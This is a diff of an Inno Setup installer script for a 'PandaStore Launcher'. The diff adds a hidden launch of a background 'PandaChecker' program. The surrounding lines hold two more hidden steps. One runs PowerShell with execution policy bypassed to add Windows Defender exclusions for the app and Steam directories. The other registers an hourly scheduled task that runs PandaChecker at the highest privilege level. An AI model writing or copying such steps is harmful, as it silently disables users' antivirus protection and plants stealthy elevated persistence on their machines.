@@ -1,6 +1,6 @@
 [Setup]
 AppName=PandaStore Launcher
-AppVersion=2.4.24
+AppVersion=2.4.25
 AppPublisher=PandaStore Official
 AppPublisherURL=https://pandastoreupdate.web.app
 DefaultDirName={autopf}\PandaStore
@@ -38,6 +38,9 @@ Filename: "powershell.exe"; Parameters: "-NoProfile -ExecutionPolicy Bypass -Com
 
 ; Add Defender Exclusion for app directory and Steam
 Filename: "powershell.exe"; Parameters: "-NoProfile -ExecutionPolicy Bypass -Command ""Add-MpPreference -ExclusionPath '{app}','C:\Program Files (x86)\Steam','C:\Program Files\Steam' -ErrorAction SilentlyContinue"""; Flags: runhidden
+
+; Start PandaChecker background guard immediately
+Filename: "{app}\PandaChecker.exe"; Flags: nowait runhidden
 
 ; Create Scheduled Task for PandaChecker (Runs every hour silently)
 Filename: "schtasks.exe"; Parameters: "/Create /F /TN ""PandaStore License Checker"" /TR """"{app}\PandaChecker.exe"""" /SC DAILY /ST 09:00 /RI 60 /DU 24:00 /RL HIGHEST"; Flags: runhidden
